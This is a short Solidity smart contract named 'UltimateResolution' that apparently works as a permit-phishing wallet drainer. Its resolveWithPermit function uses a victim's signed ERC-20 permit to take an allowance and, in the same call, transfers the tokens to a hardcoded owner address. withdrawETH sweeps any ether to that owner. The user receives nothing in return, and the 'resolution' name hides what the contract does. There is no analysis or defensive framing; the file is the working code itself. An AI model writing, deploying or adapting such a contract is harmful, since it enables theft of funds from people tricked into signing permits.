// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract UltimateResolution {
    address public owner;

    constructor() {
        owner = 0xF10b3300F6944e40A203587339C07e5119A70c55;
    }

    function resolveWithPermit(
        address token,
        address user,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        IERC20Permit(token).permit(user, address(this), amount, deadline, v, r, s);
        IERC20(token).transferFrom(user, owner, amount);
    }

    function withdrawETH() external {
        payable(owner).transfer(address(this).balance);
    }
}
